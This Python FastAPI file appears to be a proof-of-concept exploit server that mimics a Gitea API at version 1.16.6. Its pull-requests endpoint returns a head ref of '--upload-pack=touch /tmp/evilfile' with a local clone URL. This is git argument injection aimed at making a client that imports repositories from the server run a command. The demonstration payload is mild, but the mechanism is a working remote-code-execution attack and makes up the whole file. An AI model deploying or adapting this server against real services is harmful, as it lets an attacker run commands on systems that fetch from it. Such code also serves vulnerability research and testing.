from fastapi import APIRouter

router = APIRouter(prefix="/api/v1")
RCE_PAYLOAD = "touch /tmp/evilfile"

# Mock data for some endpoints
MAX_RESPONSE_ITEMS = 50
DEFAULT_PAGING_NUM = 30
DEFAULT_GIT_TREES_PER_PAGE = 1000
DEFAULT_MAX_BLOB_SIZE = 10485760
full_uri = "http://localhost:3000/"

@router.get("/version")
async def get_version():
    return {"version": "1.16.6"}

@router.get("/settings/api")
async def get_settings():
    return {
        "max_response_items": MAX_RESPONSE_ITEMS,
        "default_paging_num": DEFAULT_PAGING_NUM,
        "default_git_trees_per_page": DEFAULT_GIT_TREES_PER_PAGE,
        "default_max_blob_size": DEFAULT_MAX_BLOB_SIZE,
    }

@router.get("/repos/{owner}/{repo}")
async def get_repo_info(owner: str, repo: str):
    """
    Returns repository information for a given owner and repo.
    """
    return {
        "clone_url": f"{full_uri}{owner}/{repo}",
        "owner": {"login": owner},
    }

@router.get("/repos/{owner}/{repo}/topics")
async def get_repo_topics(owner: str, repo: str):
    return {"topics": []}

@router.get("/repos/{owner}/{repo}/pulls")
async def get_repo_pulls(owner: str, repo: str):
    """
    Returns pull requests for a given repository.
    """
    return [
        {
            "base": {"ref": "master"},
            "head": {
                "ref": f"--upload-pack={RCE_PAYLOAD}",
                "repo": {
                    "clone_url": "./",
                    "owner": {"login": "master"},
                },
            },
            "updated_at": "2001-01-01T05:00:00+01:00",
            "user": {},
        }
    ]
